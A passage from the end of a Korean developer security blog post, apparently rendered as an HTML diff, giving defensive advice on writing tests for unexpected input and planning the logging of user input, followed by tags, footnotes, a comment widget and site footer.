+<p>두 번째로 기능을 개발하면서 테스트 코드를 작성하십시오. 기능을 개발하고 바로 서비스를 업데이트하면 이러한 취약점을 쉽게 놓치게 됩니다. 개발하고자 하는 기능을 테스트 코드로 작성하다 보면 비 기능적인 부분과 기능적인 부분을 쉽게 인지하게 됩니다. 기능 완성을 우선해도 상관없습니다. 다만 해당 기능에 대한 테스트 코드에 '<strong>어떻게 하면 예상하는 것과 다른 값이 나올까?</strong>'라는 습관을 드리는 것을 추천합니다.</p>
+<h3 id="3_1">3. 로깅 전략을 잘 세워주세요</h3>
+<p>마지막으로 사용자 입력 값 로깅전략을 잘 세워야 합니다. 저희는 모든 공격을 방어할 수 없습니다. 프로덕션에 서비스를 배포했는데 보안 취약점이 발생할 수 있습니다. <strong>침해를 당했어도 원인을 분석하기 위해</strong>선 사용자 입력 값들을 적절히 로깅하고 있어야합니다. </p>
+<p>현실적으로 모든 API를 로깅하긴 어려습니다. POST 요청을 하는데 사용자 평균 요청값이 길거나, 첨부파일 자체를 로깅하거나, 대용량 트래픽을 처리하는 모든 요청 값들을 로깅하게 되면 가용성 문제가 발생할 수 있습니다. 또한 로깅을 하기 어려운 정보들도 있는데요 회원들의 채팅 기록이나 개인정보를 받는 입력 값들을 로깅할 때 접근통제가 미흡할 경우 엉뚱한 곳에서 침해사고가 발생할 수 있으니 신중해야겠죠.</p>
+<h2 id="_6">결론</h2>
+<p>이번 글을 통해 불특정 값을 신뢰할 수 있을 때 발생할 수 있는 위협들을 알아봤습니다. 개발자는 구현해야 하는 기능을 우선순위로 둬야하는 건 인정합니다. 그러나 좋은 개발자란 작성한 코드를 여러 각도로 검토하는 습관을 가지는 사람이 아닐까 싶습니다. 이러한 여러 각도를 얻기 위해선 혼자서 고민하지 말고, 동료들에게 도움을 요청하여 놓치고 있는 점이 있는지 물어보는 것도 하나의 방법이라고 생각합니다. </p>
+<p>어떠셨나요? 오늘도 잘 돌아가는 코드를 짜셨다면, 그 코드가 안전한지도 한 번 돌아보는건 어때요?
+<br/></p>
+<div class="md-typeset">
+    <div class="blogging-tags-grid">
+
+        <a href="https://fromitive.github.io/fromitive-blog/tags#security" class="blogging-tag"><code>#security</code></a>
+
+        <a href="https://fromitive.github.io/fromitive-blog/tags#python" class="blogging-tag"><code>#python</code></a>
+
+    </div>
+
+
+</div>
+
+<style>
+    .md-typeset .blogging-tags-grid {
+        display: flex;
+        flex-direction: row;
+        flex-wrap: wrap;
+        gap: 8px;
+        margin-top: 5px;
+    }
+
+    .md-typeset .blogging-tag {
+        color: var(--md-typeset-color);
+        background-color: var(--md-typeset-code-color);
+        white-space: nowrap;
+        display: block;
+    }
+
+    .md-typeset .blogging-tag code {
+        border-radius: 5px;
+    }
+</style>
+
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:1">
+<p>Catch The Flag란 문제에 숨어있는 Secret 값을 획득하여 해킹을 증명하는 문제입니다.&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+<li id="fn:3">
+<p>https://docs.docker.com/engine/containers/multi-service_container/&#160;<a class="footnote-backref" href="#fnref:3" title="Jump back to footnote 2 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+
+
+  <h2 id="__comments">Comments</h2>
+  <!-- Insert generated snippet here -->
+  <script src="https://giscus.app/client.js"
+    data-repo="fromitive/fromitive-blog"
+    data-repo-id="R_kgDOJ4LF1g"
+    data-category="Q&A"
+    data-category-id="DIC_kwDOJ4LF1s4CXvhy"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="dark_dimmed"
+    data-lang="ko"
+    crossorigin="anonymous"
+    async>
+</script>
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    /* Set palette on initial load */
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate" ? "dark" : "light"
+      giscus.setAttribute("data-theme", theme) 
+
+
+    }
+
+    /* Register event handlers after documented loaded */
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate" ? "dark" : "light"
+
+          /* Instruct Giscus to change theme */
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      &copy; 2025 <a href="https://github.com/fromitive"  target="_blank" rel="noopener">이무송</a>
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/fromitive" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M202.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M496 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/%EB%AC%B4%EC%86%A1-%EC%9D%B4-7b6b681b9/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.tracking", "navigation.sections", "navigation.indexes", "navigation.top", "search.suggest", "search.highlight", "content.tabs.link", "content.code.annotation", "content.code.copy"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.50899def.min.js"></script>
+      
+        <script src="../../javascripts/extra.js"></script>
+      
+    
+  </body>
+</html>
